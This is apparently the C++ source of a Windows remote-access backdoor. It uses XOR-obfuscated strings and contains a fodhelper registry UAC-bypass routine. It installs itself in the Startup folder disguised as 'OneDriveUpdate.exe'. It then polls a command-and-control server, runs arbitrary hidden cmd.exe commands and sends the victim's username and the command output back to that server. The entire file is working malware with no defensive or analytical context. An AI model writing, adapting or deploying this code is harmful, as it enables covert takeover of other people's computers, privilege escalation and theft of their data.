#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <shlobj.h>
#include <string>
#include <memory>
#include <vector>
#include <fstream>

#include "config.h"

using namespace std;

string Deobfuscate(const char* encrypted_data, size_t length) {
    string decrypted = "";
    for (size_t i = 0; i < length; i++) {
        decrypted += (encrypted_data[i] ^ XOR_KEY);
    }
    return decrypted;
}

// "cmd /c "
char S_CMD[] = {0x58, 0x56, 0x5f, 0x1b, 0x14, 0x58, 0x1b};
// "Mozilla/5.0"
char S_UA[] = {0x76, 0x54, 0x41, 0x52, 0x57, 0x57, 0x5a, 0x14, 0x0e, 0x15, 0x0b};
// "Software\Classes\ms-settings\Shell\Open\command"
char S_REG[] = {0x68, 0x54, 0x5d, 0x4f, 0x4c, 0x5a, 0x49, 0x5e, 0x66, 0x57, 0x5a, 0x48, 0x48, 0x5e, 0x48, 0x66, 0x56, 0x48, 0x16, 0x48, 0x5e, 0x4f, 0x4f, 0x52, 0x55, 0x5c, 0x48, 0x66, 0x68, 0x53, 0x5e, 0x57, 0x57, 0x66, 0x74, 0x4b, 0x5e, 0x55, 0x66, 0x58, 0x54, 0x56, 0x56, 0x5a, 0x55, 0x5f};
// "fodhelper.exe"
char S_FOD[] = {0x5d, 0x54, 0x5f, 0x53, 0x5e, 0x57, 0x4b, 0x5e, 0x49, 0x15, 0x5e, 0x43, 0x5e};
// "\OneDriveUpdate.exe"
char S_PER[] = {0x67, 0x74, 0x55, 0x5e, 0x7f, 0x49, 0x52, 0x4d, 0x5e, 0x6e, 0x4b, 0x5f, 0x5a, 0x4f, 0x5e, 0x15, 0x5e, 0x43, 0x5e};
// "DelegateExecute"
char S_DLG[] = {0x7f, 0x5e, 0x57, 0x5e, 0x5c, 0x5a, 0x4f, 0x5e, 0x7e, 0x43, 0x5e, 0x58, 0x4e, 0x4f, 0x5e};
// "open"
char S_OPN[] = {0x54, 0x4b, 0x5e, 0x55};

void UACBypass() {
    HKEY hKey;
    char szPath[MAX_PATH];
    if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) return;

    char cmd[MAX_PATH + 50];
    sprintf(cmd, "%s", szPath); 

    string regPath = Deobfuscate(S_REG, sizeof(S_REG));
    string delegate = Deobfuscate(S_DLG, sizeof(S_DLG));
    string s_open = Deobfuscate(S_OPN, sizeof(S_OPN));
    string s_fod = Deobfuscate(S_FOD, sizeof(S_FOD));

    if (RegCreateKeyExA(HKEY_CURRENT_USER, regPath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "", 0, REG_SZ, (unsigned char*)cmd, strlen(cmd));
        RegSetValueExA(hKey, delegate.c_str(), 0, REG_SZ, (unsigned char*)"", 0);
        RegCloseKey(hKey);
        ShellExecuteA(NULL, s_open.c_str(), s_fod.c_str(), NULL, NULL, SW_HIDE);
    }
}

void InstallPersistence() {
    char szPath[MAX_PATH];
    char szDest[MAX_PATH];
    if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) return;

    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, szDest))) {
        string s_per = Deobfuscate(S_PER, sizeof(S_PER));
        strcat(szDest, s_per.c_str());
        CopyFileA(szPath, szDest, FALSE);
    }
}

string GetTaskFromC2(const char* url) {
    string ua = Deobfuscate(S_UA, sizeof(S_UA));
    HINTERNET hInternet = InternetOpenA(ua.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return "";
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }

    char buffer[1024];
    DWORD bytesRead;
    string response = "";

    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = 0;
        response += buffer;
    }
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return response;
}

void SendResultToC2(const char* ip, int port, const char* path, string data) {
    string ua = Deobfuscate(S_UA, sizeof(S_UA));
    HINTERNET hInternet = InternetOpenA(ua.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetConnectA(hInternet, ip, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return; }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return; }

    string headers = "Content-Type: text/plain\r\n";
    HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)data.c_str(), data.length());

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

void SpawnProgram(const char* cmd) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW; 
    ZeroMemory(&pi, sizeof(pi));

    char cmdMutable[MAX_PATH];
    strncpy(cmdMutable, cmd, MAX_PATH - 1);
    cmdMutable[MAX_PATH - 1] = 0;

    if (CreateProcessA(NULL,
                       cmdMutable,
                       NULL, 
                       NULL, 
                       FALSE,
                       0,    
                       NULL, 
                       NULL, 
                       &si,  
                       &pi)  
       ) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

string ExecCommand(const char* cmd) {
    string result = "";
    HANDLE hPipeRead, hPipeWrite;

    SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
        return "[-] Error CreatePipe";
    }

    STARTUPINFOA si = {0};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hPipeWrite;
    si.hStdError = hPipeWrite; 

    PROCESS_INFORMATION pi = {0};

    string full_cmd = "cmd.exe /c " + string(cmd);

    char cmd_mutable[1024];
    strncpy(cmd_mutable, full_cmd.c_str(), sizeof(cmd_mutable));
    cmd_mutable[sizeof(cmd_mutable) - 1] = 0;

    if (!CreateProcessA(NULL, cmd_mutable, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        return "[-] Error CreateProcess";
    }

    CloseHandle(hPipeWrite);

    char buffer[128];
    DWORD bytesRead;
    while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = 0;
        result += buffer;
    }

    CloseHandle(hPipeRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return result;
}

int main() {
    InstallPersistence();

    string c2_ip = Deobfuscate(S_IP, sizeof(S_IP));
    int c2_port = C2_PORT;
    char username[256];
    DWORD len = 256;
    GetUserNameA(username, &len);
    
    string welcome = "[+] Backdoor connected. Current user : ";
    welcome += string(username);
    string url_task = "http://" + c2_ip + ":" + to_string(c2_port) + "/get_task";
    SendResultToC2(c2_ip.c_str(), c2_port, "/post_result", welcome);
    while (true) {
        int jitter = (rand() % 2000) + 1000;
        Sleep(jitter);

        string tache = GetTaskFromC2(url_task.c_str());

        if (tache.length() > 0 && tache.substr(0, 4) != "IDLE") {
            string resultat = "";
            
            if (tache.rfind("spawn ", 0) == 0) {
                string cmd_to_run = tache.substr(6);
                SpawnProgram(cmd_to_run.c_str());
                resultat = "[+] Process in background : " + cmd_to_run;
            }
            else if (tache == "whoami") {
                resultat = string(username);
            } else if (tache.rfind("prank ", 0) == 0) {
                string message = tache.substr(6);
                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                string filename = string(tempPath) + "important.txt";
                        
                ofstream outfile(filename);
                if (outfile.is_open()) {
                    outfile << message << endl;
                    outfile << "\n\n(Don't be so harsh on yourself, everybody can make mistake)" << endl;
                    outfile.close();
                    
                    // 4. Ouvrir le fichier via son chemin complet
                    // NULL à la place de "open" force l'action par défaut (souvent plus fiable)
                    ShellExecuteA(NULL, NULL, filename.c_str(), NULL, NULL, SW_SHOW);
                    
                    resultat = "[+] Prank executed: Notepad opened at " + filename;
                } else {
                    resultat = "[-] Error: Could not write to " + filename;
                }
            }
            else {
                resultat = ExecCommand(tache.c_str());
            }

            if (resultat.length() > 0) {
                SendResultToC2(c2_ip.c_str(), c2_port, "/post_result", resultat);
            }
        }
    }
    return 0;
}